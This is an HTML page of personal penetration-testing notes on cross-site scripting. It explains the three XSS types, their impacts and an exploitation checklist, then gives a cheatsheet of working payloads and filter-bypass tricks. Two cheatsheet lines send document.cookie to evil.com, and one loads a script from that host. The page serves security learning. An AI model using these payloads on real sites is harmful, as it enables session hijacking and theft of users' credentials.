<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>Cross-Site Scripting (XSS) - Penetration Testing Notes</title> <link rel="shortcut icon" href="/pen-test-docs/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/pen-test-docs/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/pen-test-docs/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/pen-test-docs/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Cross-Site Scripting (XSS) | Penetration Testing Notes</title> <meta name="generator" content="Jekyll v3.9.2" /> <meta property="og:title" content="Cross-Site Scripting (XSS)" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Documented notes and learning for penetration testing and related cyber security testing." /> <meta property="og:description" content="Documented notes and learning for penetration testing and related cyber security testing." /> <link rel="canonical" href="https://alipali737.github.io/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html" /> <meta property="og:url" content="https://alipali737.github.io/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html" /> <meta property="og:site_name" content="Penetration Testing Notes" /> <meta property="og:type" content="website" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Cross-Site Scripting (XSS)" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"Documented notes and learning for penetration testing and related cyber security testing.","headline":"Cross-Site Scripting (XSS)","url":"https://alipali737.github.io/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/pen-test-docs/assets/js/toggle_init.js"></script> <div class="side-bar"> <div class="site-header"> <a href="/pen-test-docs/" class="site-title lh-tight"> Penetration Testing Notes </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/" class="nav-list-link">Home</a></li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/setting-up/setting-up.html" class="nav-list-link">Setting Up</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/setting-up/Logging.html" class="nav-list-link">CLI Logging</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Containers.html" class="nav-list-link">Containers</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/operating-systems.html" class="nav-list-link">Operating Systems</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Screenshotting.html" class="nav-list-link">Screenshotting</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/useful-git-repos.html" class="nav-list-link">Useful Github Repos</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/virtual-private-servers.html" class="nav-list-link">Virtual Private Servers</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Virtualization.html" class="nav-list-link">Virtualization</a></li> </ul> </li> <li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/Attacks%20Index.html" class="nav-list-link active">Attacks</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/osint/OSINT%20Index.html" class="nav-list-link">Open-source Intelligence</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/osint/OSINT%20Framework.html" class="nav-list-link">OSINT Framework</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Index.html" class="nav-list-link">SQL Injection</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/Introduction.html" class="nav-list-link">Introduction</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/Basic%20SQL%20Syntax.html" class="nav-list-link">Basic SQL Syntax</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html" class="nav-list-link">SQL Injection Cheatsheet</a></li> </ul> </li> <li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/web-application/Web%20Application%20Index.html" class="nav-list-link active">Web Application</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html" class="nav-list-link">Cross-Site Request Forgery (CSRF)</a></li> <li class="nav-list-item active"><a href="/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html" class="nav-list-link active">Cross-Site Scripting (XSS)</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Directory%20Enumeration%20Attack.html" class="nav-list-link">Directory Enumeration Attack</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html" class="nav-list-link">Server Side Includes (SSI Framework) (.shtml)</a></li> </ul> </li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Knowledge%20Index.html" class="nav-list-link">Knowledge</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Networks/Networks%20Index.html" class="nav-list-link">Networks</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html" class="nav-list-link">TCP/IP Framework</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html" class="nav-list-link">Wireless Network Security</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Testing/Testing%20Index.html" class="nav-list-link">Testing</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html" class="nav-list-link">Application Security Testing Methods</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Tools/Tools%20Index.html" class="nav-list-link">Tools</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Tools/Nmap.html" class="nav-list-link">Nmap</a></li> </ul> </li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Courses/Courses%20Index.html" class="nav-list-link">Courses</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html" class="nav-list-link">Penetration Testing Fundamentals Bootcamp</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/labs%20index.html" class="nav-list-link">Practice Labs</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/overthewire/overthewire%20index.html" class="nav-list-link">OverTheWire</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/overthewire/Bandit.html" class="nav-list-link">Bandit Lab</a></li> </ul> </li> <li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/tryhackme/tryhackme%20index.html" class="nav-list-link">TryHackMe</a></li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/vulnhub/vulnhub%20index.html" class="nav-list-link">VulnHub</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html" class="nav-list-link">Empire: Breakout CTF</a></li> </ul> </li> </ul> </li> </ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Penetration Testing Notes" aria-label="Search Penetration Testing Notes" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="//github.com/alipali737/pen-test-docs" class="site-button" > Github Source </a> </li> </ul> </nav> </div> <div id="main-content-wrap" class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/pen-test-docs/Attacks/Attacks%20Index.html">Attacks</a> </li><li class="breadcrumb-nav-list-item"> <a href="/pen-test-docs/Attacks/web-application/Web%20Application%20Index.html">Web Application</a> </li><li class="breadcrumb-nav-list-item"> <span>Cross-Site Scripting (XSS)</span> </li> </ol> </nav> <div id="main-content" class="main-content" role="main"> <h1 class="no_toc" id="cross-site-scripting-xss"> <a href="#cross-site-scripting-xss" class="anchor-heading" aria-labelledby="cross-site-scripting-xss"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cross-Site Scripting (XSS) </h1> <details open=""> <summary class="text-delta"> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Table of contents
</code></pre></div> </div> </summary> <ul id="markdown-toc"> <li><a href="#reflective-xss" id="markdown-toc-reflective-xss">Reflective XSS</a></li> <li><a href="#stored-xss" id="markdown-toc-stored-xss">Stored XSS</a></li> <li><a href="#dom-based-xss" id="markdown-toc-dom-based-xss">DOM-Based XSS</a></li> <li><a href="#impacts-of-xss" id="markdown-toc-impacts-of-xss">Impacts of XSS</a></li> <li><a href="#exploiting-xss" id="markdown-toc-exploiting-xss">Exploiting XSS</a> <ul> <li><a href="#xss-cheatsheet" id="markdown-toc-xss-cheatsheet">XSS Cheatsheet</a> <ul> <li><a href="#xss-locators" id="markdown-toc-xss-locators">XSS Locators</a></li> <li><a href="#classic-payloads" id="markdown-toc-classic-payloads">Classic Payloads</a></li> <li><a href="#html-tags" id="markdown-toc-html-tags">HTML Tags</a></li> </ul> </li> <li><a href="#useful-example-situations" id="markdown-toc-useful-example-situations">Useful Example Situations</a> <ul> <li><a href="#bypass-angle-bracket-filter" id="markdown-toc-bypass-angle-bracket-filter">Bypass Angle Bracket Filter</a></li> <li><a href="#string-subtraction-injection" id="markdown-toc-string-subtraction-injection">String Subtraction Injection</a></li> </ul> </li> </ul> </li> </ul> </details><hr /> <p>Cross-Site Scripting is a type of injection where JavaScript code can be injected into a website. A XSS attack is where an attacker has embedded malicious code, often in the form of a browser-side script that is then sent to an unsuspecting user when they request the webpage.</p> <p>These attacks can occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. The malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.</p> <p>There are 3 types of XSS attacks:</p> <ul> <li><a href="#reflective-xss">Reflective XSS</a> - Injected code is reflected back to a user by the web application</li> <li><a href="#stored-xss">Stored XSS</a> - The injected code is stored on the webserver and is requested by the user</li> <li><a href="#dom-based-xss">DOM-Based XSS</a> - The injected code manipulates the client-side DOM, resulting in the execution of code on the victim’s browser.</li> </ul> <h2 id="reflective-xss"> <a href="#reflective-xss" class="anchor-heading" aria-labelledby="reflective-xss"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Reflective XSS </h2> <p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.</p> <p>When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable website, which reflects the attack back to the user’s browser. The browser then executes this as it appears to have come from a ‘Trusted’ server.</p> <p>This can lead to various security issue, such as stealing user information (eg. credentials or tokens) or performing unauthorised actions on behalf of a user.</p> <p>These attacks are often initiated by creating malicious links or forms that exploit vulnerabilities in the target application.</p> <p>Sometimes referred to as Non-Persistent or Type-II XSS.</p> <h2 id="stored-xss"> <a href="#stored-xss" class="anchor-heading" aria-labelledby="stored-xss"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Stored XSS </h2> <p>Stored attacks are those where the injected script is permanently stored on the target server, such as in a database, comment section, message forum etc. The victim then retries the script from the server when it requests the stored information.</p> <p>Unlike reflective XSS, the injected code is not reflected back immediately but rather stored on the target server and delivered to other users later. This makes stored XSS attacks particularly dangerous, as the malicious code affects multiple users and can lead to unauthorized access, data theft, or even complete website compromise.</p> <p>Sometimes referred to a Persistent or Type-II XSS.</p> <h2 id="dom-based-xss"> <a href="#dom-based-xss" class="anchor-heading" aria-labelledby="dom-based-xss"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> DOM-Based XSS </h2> <p>This attack occurs when an attacker injects and manipulates malicious code into the Document Object Model (DOM) of a webpage. In DOM-Based XSS attacks the malicious injected code is usually executed by JavaScript directly in the victim’s browser, without being sent to the server.</p> <p>The vulnerable webpage often includes JavaScript that reads data from the URL or user input and then dynamically updates the DOM, but fails to properly sanitize or validate the input, allowing injected code to be executed.</p> <h2 id="impacts-of-xss"> <a href="#impacts-of-xss" class="anchor-heading" aria-labelledby="impacts-of-xss"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Impacts of XSS </h2> <ul> <li>Impersonating or masquerading as the victim user</li> <li>Hijacking a user’s session</li> <li>Perform unauthorized actions on behalf of the user</li> <li>Steal sensitive information</li> <li>Perform phishing attacks</li> <li>Capture user credentials</li> <li>Capture keystrokes</li> <li>Deface the website / Edit its content</li> <li>Inject trojan functionality into the website</li> </ul> <h2 id="exploiting-xss"> <a href="#exploiting-xss" class="anchor-heading" aria-labelledby="exploiting-xss"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting XSS </h2> <p>When exploiting an XSS vulnerability, you need to understand how the application behaves towards specific payloads. The following checklist can be used before exploiting an XSS vulnerability:</p> <ul> <li>Find the backlisted/filtered characters. XSS locations can be used for this: <code class="language-plaintext highlighter-rouge">'';! - "&lt;XSS&gt;=&amp;{()}</code></li> <li>Observe what tags are blocked by Web Application Firewall (WAF) and which keywords are allowed (<code class="language-plaintext highlighter-rouge">iframe</code>, <code class="language-plaintext highlighter-rouge">img</code>, <code class="language-plaintext highlighter-rouge">body</code> etc.)</li> <li>Try character encoding (<a href="https://www.w3schools.com/tags/ref_urlencode.ASP">URL encoding</a>, <a href="https://owasp.org/www-community/Double_Encoding">Double URL encoding</a>, UTF-8 Unicode encoding, Long UTF-8 Unicode encoding, Hex encoding etc.)</li> <li>Try <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-using-html-quote-encapsulation">XSS using HTML quote encapsulation</a></li> <li>Try <a href="https://docs.trellix.com/bundle/network-security-platform-application-notes/page/GUID-CCB698B2-851B-48DE-8E1F-93968ED36C2E.html">URL string evasion</a></li> <li>Create the payload list according to the allowed keywords</li> <li>Brute-force the application with the XSS payload list you just created</li> </ul> <blockquote> <p>Note: Double URL encoding can be tried since the first decoding process is performed by HTTP protocol and the resultant encoded URL will bypass the XSS filter.</p> </blockquote> <h3 id="xss-cheatsheet"> <a href="#xss-cheatsheet" class="anchor-heading" aria-labelledby="xss-cheatsheet"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XSS Cheatsheet </h3> <p>A very useful OWASP XSS <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">cheatsheet</a>. Another useful <a href="https://github.com/RenwaX23/XSS-Payloads/tree/master">cheatsheet repo &amp; other links</a></p> <h4 id="xss-locators"> <a href="#xss-locators" class="anchor-heading" aria-labelledby="xss-locators"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XSS Locators </h4> <figure class="highlight"><pre><code class="language-html" data-lang="html">'';!--"<span class="nt">&lt;XSS&gt;</span>=<span class="err">&amp;</span>{()}</code></pre></figure> <h4 id="classic-payloads"> <a href="#classic-payloads" class="anchor-heading" aria-labelledby="classic-payloads"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Classic Payloads </h4> <figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script    &gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;ScRipT&gt;</span>alert(1)<span class="nt">&lt;/scRipT&gt;</span>
<span class="nt">&lt;</span><span class="err">%00</span><span class="na">script</span><span class="nt">&gt;</span>alert(1)<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nx">al</span><span class="o">%</span><span class="mi">00</span><span class="nx">ert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure> <h4 id="html-tags"> <a href="#html-tags" class="anchor-heading" aria-labelledby="html-tags"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> HTML Tags </h4> <figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span><span class="err">/</span><span class="na">src=</span><span class="s">x</span> <span class="na">a=</span><span class="s">''</span> <span class="na">onerror=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
<span class="nt">&lt;IMG</span> <span class="err">"""</span><span class="nt">&gt;&lt;SCRIPT&gt;</span>alert(1)<span class="nt">&lt;/SCRIPT&gt;</span>"&gt;
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">`x`onerror=alert(1)</span><span class="nt">&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'/'</span> <span class="na">onerror=</span><span class="s">'alert("kalisa")'</span><span class="nt">&gt;</span>
<span class="nt">&lt;IMG</span> <span class="na">SRC=</span><span class="s">#</span> <span class="na">onmouseover=</span><span class="s">"alert('xss')"</span><span class="nt">&gt;</span>
<span class="nt">&lt;IMG</span> <span class="na">SRC= </span><span class="s">onmouseover="alert('xss')"</span><span class="nt">&gt;</span>
<span class="nt">&lt;IMG</span> <span class="na">onmouseover=</span><span class="s">"alert('xss')"</span><span class="nt">&gt;</span>
<span class="nt">&lt;BODY</span> <span class="na">ONLOAD=</span><span class="s">alert('XSS')</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">TYPE=</span><span class="s">"IMAGE"</span> <span class="na">SRC=</span><span class="s">"javascript:alert('XSS');"</span><span class="nt">&gt;</span>
<span class="nt">&lt;SCRIPT</span> <span class="na">SRC=</span><span class="s">http:/evil.com/xss.js?&lt;</span> <span class="na">B</span> <span class="nt">&gt;</span>
"&gt;<span class="nt">&lt;XSS</span><span class="err">&lt;</span><span class="na">test</span> <span class="na">accesskey=</span><span class="s">x</span> <span class="na">onclick=</span><span class="s">alert(1)//test</span>
<span class="err">&lt;</span><span class="na">svg</span><span class="nt">&gt;&lt;discard</span> <span class="na">onbegin=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nx">image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">image</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">https://evil.com/?c=</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nx">image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">image</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="dl">"</span><span class="s2">evil.com/</span><span class="dl">"</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span></code></pre></figure> <p>The <code class="language-plaintext highlighter-rouge">javascript:alert(1);</code> can be injected to run in-line java (eg. in a URL)</p> <h3 id="useful-example-situations"> <a href="#useful-example-situations" class="anchor-heading" aria-labelledby="useful-example-situations"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Useful Example Situations </h3> <h4 id="bypass-angle-bracket-filter"> <a href="#bypass-angle-bracket-filter" class="anchor-heading" aria-labelledby="bypass-angle-bracket-filter"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bypass Angle Bracket Filter </h4> <p>In a Reflective XSS where the <code class="language-plaintext highlighter-rouge">&lt;</code> &amp; <code class="language-plaintext highlighter-rouge">&gt;</code> are both blacklisted/encoded. You can still inject code if the user input is injected within a tag already. This relies on the <code class="language-plaintext highlighter-rouge">"</code> not being escaped as <code class="language-plaintext highlighter-rouge">&amp;quot</code>.</p> <figure class="highlight"><pre><code class="language-html" data-lang="html">" onmouseover="alert(1)</code></pre></figure> <p>Would result in something like a search box like:</p> <figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">text</span> <span class="na">placeholder=</span><span class="s">'Search the blog...'</span> <span class="na">name=</span><span class="s">search</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span></code></pre></figure> <p>Being turned into:</p> <figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">text</span> <span class="na">placeholder=</span><span class="s">'Search the blog...'</span> <span class="na">name=</span><span class="s">search</span> <span class="na">value=</span><span class="s">""</span> <span class="na">onmouseover=</span><span class="s">"alert(1)"</span><span class="nt">&gt;</span></code></pre></figure> <h4 id="string-subtraction-injection"> <a href="#string-subtraction-injection" class="anchor-heading" aria-labelledby="string-subtraction-injection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> String Subtraction Injection </h4> <p>If a variable is set of the user input eg.</p> <figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">userInput</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span></code></pre></figure> <p>If you then take a string and subtract a function from it, it will in turn run the function. Eg.</p> <figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">userInput</span> <span class="o">=</span> <span class="dl">''</span><span class="o">-</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="dl">''</span><span class="p">;</span></code></pre></figure> <p>So the payload would be <code class="language-plaintext highlighter-rouge">'-alert(1)-'</code></p> <hr> <footer> <p class="text-small text-grey-dk-100 mb-0">This page is being build from gh-pages at revision 356325f0939cd0b4bd7a9ff47d8bccd91b417980</p> </footer> </div> </div> <div class="search-overlay"></div> </div> <script type="text/javascript" src="/pen-test-docs/assets/js/toggle_mode.js"></script> </body> </html>
